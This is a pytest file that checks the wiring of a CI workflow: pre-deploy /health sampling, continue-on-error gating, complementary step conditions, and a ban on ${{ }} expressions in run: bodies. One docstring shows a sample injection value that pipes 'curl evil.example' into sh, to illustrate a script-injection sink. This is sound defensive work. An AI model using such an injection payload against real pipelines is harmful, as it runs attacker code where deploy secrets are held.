"""Static-shape tests for the LML#1231 reconciliation wiring in ``.github/workflows/ci.yml``.

``deploy-staging`` and ``deploy-production`` are identical in shape: `railway up
--detach --json` captures a `deploymentId`, then `scripts/wait_for_railway_deployment.sh`
polls it. If the upload request itself fails (a client-side network timeout), no id is ever
produced -- the wait step (which needs it) gets skipped, and the job goes red even though
Railway may have accepted the upload and the revision went live minutes later.

The fix adds a reconciliation path for exactly that case, and it depends on ordering and
gating properties a script-level test cannot see -- only the workflow YAML can:

- a step samples ``/health``'s ``commit_sha`` *before* ``railway up`` runs, so
  ``scripts/reconcile_deploy_via_health.sh`` has the pre-upload baseline its whole trap-avoidance
  design depends on (see that script's header);
- the ``Deploy to Railway`` step must not hard-fail the job on its own -- GitHub Actions has no
  way to "un-fail" a job from a later step once an earlier one has failed outright, so
  ``continue-on-error: true`` is the only mechanism that lets a later step become the real
  arbiter of red/green;
- ``Wait for deployment to go live`` must run only when a deployment id was actually produced
  (otherwise it runs with an empty id and hits the script's own usage-error exit, which is a
  different bug wearing the same symptom);
- the new reconciliation step must run only in the complementary case (no deployment id), and
  must be wired to the right per-job ``/health`` URL, the pre-upload sample, and ``github.sha``.

Scraped with regex rather than YAML-parsed, matching this repo's existing workflow tests
(``test_install_actionlint_auth.py``): PyYAML is not a declared dependency here.
"""

import re
from pathlib import Path

import pytest

_WORKFLOW = Path(__file__).resolve().parents[2] / ".github" / "workflows" / "ci.yml"
_WORKFLOW_TEXT = _WORKFLOW.read_text()

_JOBS = [
    pytest.param(
        "deploy-staging",
        "https://library-metadata-lookup-staging.up.railway.app/health",
        id="staging",
    ),
    pytest.param(
        "deploy-production",
        "https://library-metadata-lookup-production.up.railway.app/health",
        id="production",
    ),
]


def _job_block(job_name: str) -> str:
    """The full text of one top-level job, from its key to the next top-level key."""
    lines = _WORKFLOW_TEXT.splitlines()
    start = next(
        (i for i, line in enumerate(lines) if re.match(rf"^  {re.escape(job_name)}:\s*$", line)),
        None,
    )
    assert start is not None, f"job {job_name!r} not found in {_WORKFLOW}"
    end = len(lines)
    for i in range(start + 1, len(lines)):
        # A sibling top-level job/key starts at the same two-space indent.
        if re.match(r"^  \S", lines[i]):
            end = i
            break
    return "\n".join(lines[start:end])


def _step_line_index(job_text: str, name_substring: str) -> int:
    lines = job_text.splitlines()
    for i, line in enumerate(lines):
        if line.lstrip().startswith("- name:") and name_substring in line:
            return i
    raise AssertionError(f"no step named like {name_substring!r} in job block")


def _step_block(job_text: str, name_substring: str) -> str:
    lines = job_text.splitlines()
    start = _step_line_index(job_text, name_substring)
    indent = len(lines[start]) - len(lines[start].lstrip())
    end = len(lines)
    for i in range(start + 1, len(lines)):
        stripped = lines[i].strip()
        if stripped.startswith("- ") and (len(lines[i]) - len(lines[i].lstrip())) <= indent:
            end = i
            break
    return "\n".join(lines[start:end])


@pytest.mark.parametrize("job_name,health_url", _JOBS)
def test_health_is_sampled_before_railway_up_runs(job_name, health_url):
    """The pre-upload baseline must be taken strictly before `railway up`, or it isn't a
    pre-upload baseline at all -- it would just be a second post-hoc reading."""
    job = _job_block(job_name)
    sample_idx = _step_line_index(job, "Sample /health before upload")
    deploy_idx = _step_line_index(job, "Deploy to Railway")

    assert sample_idx < deploy_idx

    sample_step = _step_block(job, "Sample /health before upload")
    assert "scripts/sample_health_commit_sha.sh" in sample_step
    assert health_url in sample_step
    assert re.search(r"^\s*id:\s*pre_deploy_health\s*$", sample_step, re.M), (
        "the sample step needs an id so the reconciliation step can reference its output"
    )


@pytest.mark.parametrize("job_name,health_url", _JOBS)
def test_deploy_step_does_not_hard_fail_the_job_on_its_own(job_name, health_url):
    """continue-on-error is what makes a later step able to decide red/green at all: once a step
    fails outright, no later step's success can undo that job-level failure in GitHub Actions."""
    job = _job_block(job_name)
    deploy_step = _step_block(job, "Deploy to Railway")

    assert re.search(r"^\s*continue-on-error:\s*true\s*$", deploy_step, re.M)
    assert re.search(r"^\s*id:\s*deploy\s*$", deploy_step, re.M)


@pytest.mark.parametrize("job_name,health_url", _JOBS)
def test_wait_step_only_runs_when_a_deployment_id_exists(job_name, health_url):
    job = _job_block(job_name)
    wait_step = _step_block(job, "Wait for deployment to go live")

    assert re.search(
        r"^\s*if:\s*steps\.deploy\.outputs\.deployment_id\s*!=\s*''\s*$", wait_step, re.M
    )


@pytest.mark.parametrize("job_name,health_url", _JOBS)
def test_reconciliation_step_only_runs_when_no_deployment_id_exists(job_name, health_url):
    job = _job_block(job_name)
    reconcile_step = _step_block(job, "Reconcile deploy with no deployment id")

    assert re.search(
        r"^\s*if:\s*steps\.deploy\.outputs\.deployment_id\s*==\s*''\s*$", reconcile_step, re.M
    )
    assert "scripts/reconcile_deploy_via_health.sh" in reconcile_step
    assert health_url in reconcile_step
    assert "github.sha" in reconcile_step
    assert "steps.pre_deploy_health.outputs.commit_sha" in reconcile_step


@pytest.mark.parametrize("job_name,health_url", _JOBS)
def test_no_deploy_step_interpolates_an_expression_into_its_shell_script(job_name, health_url):
    """``${{ }}`` in a ``run:`` body is textual substitution *before* the shell sees the script,
    so any expression whose value isn't fully under our control is a script-injection sink.

    ``steps.pre_deploy_health.outputs.commit_sha`` is exactly such a value: it is whatever
    ``jq`` pulled out of a **remote HTTP response body** from ``/health``. Interpolated into
    ``run:``, a ``commit_sha`` of ``"; curl evil.example | sh #`` would execute -- in a job that
    holds ``RAILWAY_TOKEN_PRODUCTION``. And the reachability argument is the wrong way round from
    the usual "but it's our own service": this step runs *only* when the deploy infrastructure is
    already misbehaving, which is precisely when the endpoint's output is least trustworthy.

    The documented mitigation is indirection through ``env:`` -- the expression is expanded into
    an environment variable's value, which the shell then reads as data rather than parsing as
    source. So no ``run:`` body in these jobs may contain an expression at all, including the
    ones (like ``github.sha``) that happen to be safe today: an all-or-nothing rule is the only
    kind a reviewer can check at a glance, and it doesn't rot when a step gains an argument.
    """
    job = _job_block(job_name)
    for step_name in (
        "Sample /health before upload",
        "Deploy to Railway",
        "Wait for deployment to go live",
        "Reconcile deploy with no deployment id",
    ):
        step = _step_block(job, step_name)
        # The `run:` body is everything from the `run:` key up to the sibling `env:` key.
        run_body = re.search(r"^(\s*)run:(.*?)(?=^\1env:|\Z)", step, re.M | re.S)
        assert run_body is not None, f"{step_name!r} has no `run:` body"
        assert "${{" not in run_body.group(2), (
            f"{step_name!r} interpolates a workflow expression directly into its shell script. "
            "Pass it through `env:` and reference it as a shell variable instead, so the value "
            "reaches the shell as data rather than as source text."
        )


@pytest.mark.parametrize("job_name,health_url", _JOBS)
def test_the_two_gated_steps_are_exhaustive_so_a_failed_deploy_cannot_report_green(
    job_name, health_url
):
    """The safety property that ``continue-on-error`` on the deploy step buys its keep with.

    Masking that step's failure means it no longer fails the job by itself, so the job's whole
    red/green verdict now rests on the two gated steps below it. They must be *exhaustive*:
    if a path existed where ``railway up`` fails and neither the wait step nor the reconciliation
    step runs, the job would report green on a deploy that never landed -- strictly worse than the
    false red this change set out to remove.

    Two independent properties make them exhaustive, and this test pins both:

    1. **The conditions are exact complements over one expression.** ``!= ''`` and ``== ''`` on the
       same ``steps.deploy.outputs.deployment_id``, evaluated with one semantics. Whatever that
       output is -- a real id, the empty string, or ``null`` because the step died before writing
       ``$GITHUB_OUTPUT`` at all -- exactly one condition is true. (GitHub casts mismatched operand
       types to numbers, and both ``null`` and ``''`` cast to ``0``, so an unset output takes the
       ``== ''`` branch; both conditions coerce identically, so they stay complements regardless.)
    2. **Neither condition contains a status-check function**, so both carry the implicit
       ``success()`` -- which is *true* here, because ``continue-on-error`` turns the failed deploy
       step's ``conclusion`` into ``success`` even though its ``outcome`` stays ``failure``.

    Property 2 is the subtle one, and the trap is live: the issue's own suggested approach was to
    run the reconciliation ``if: failure()``. That reads correctly and is exactly wrong once
    ``continue-on-error`` is in play -- ``failure()`` would never fire, the wait step would skip on
    the empty id, and a failed upload would sail through green with no verification at all. Any
    status-check function in either condition reintroduces that hole, so none is allowed.
    """
    job = _job_block(job_name)
    conditions = {}
    for step_name in ("Wait for deployment to go live", "Reconcile deploy with no deployment id"):
        step = _step_block(job, step_name)
        found = re.findall(r"^\s*if:\s*(.+?)\s*$", step, re.M)
        assert len(found) == 1, (
            f"{step_name!r} must carry exactly one single-line `if:`, got {found}"
        )
        conditions[step_name] = found[0]

    wait_if = conditions["Wait for deployment to go live"]
    reconcile_if = conditions["Reconcile deploy with no deployment id"]

    for step_name, condition in conditions.items():
        assert not re.search(r"\b(success|failure|always|cancelled)\s*\(", condition), (
            f"{step_name!r} gates on {condition!r}, which contains a status-check function. That "
            "replaces the implicit success() -- true here, since continue-on-error makes the "
            "failed deploy step's conclusion `success` -- and can skip BOTH gated steps, "
            "reporting green on a deploy that never landed."
        )

    assert wait_if == "steps.deploy.outputs.deployment_id != ''"
    assert reconcile_if == "steps.deploy.outputs.deployment_id == ''"
    # Belt and braces: the two differ in the operator alone, so they cannot drift onto different
    # expressions (which would break exhaustiveness while both still looked individually correct).
    assert wait_if.replace("!=", "==") == reconcile_if


@pytest.mark.parametrize("job_name,health_url", _JOBS)
def test_reconciliation_step_runs_after_the_wait_step(job_name, health_url):
    """Ordering doesn't change which one actually executes (their `if`s are mutually exclusive
    on deployment_id), but keeping the reconciliation path textually after the normal wait path
    keeps the job's step list reading like the two branches of one decision."""
    job = _job_block(job_name)
    wait_idx = _step_line_index(job, "Wait for deployment to go live")
    reconcile_idx = _step_line_index(job, "Reconcile deploy with no deployment id")

    assert wait_idx < reconcile_idx


def test_smoke_test_jobs_still_depend_on_the_deploy_jobs():
    """Acceptance criterion: Smoke Test must run once the deploy job is judged recovered. No
    wiring change is needed for this -- `needs:` already runs the downstream job whenever the
    upstream job's overall conclusion is success, and continue-on-error plus a passing
    reconciliation step is what makes that conclusion success -- but a regression here would
    silently break the acceptance criterion, so it stays pinned."""
    staging_smoke = _job_block("smoke-test-staging")
    production_smoke = _job_block("smoke-test-production")

    assert re.search(r"^\s*needs:\s*\[deploy-staging\]\s*$", staging_smoke, re.M)
    assert re.search(r"^\s*needs:\s*\[deploy-production\]\s*$", production_smoke, re.M)
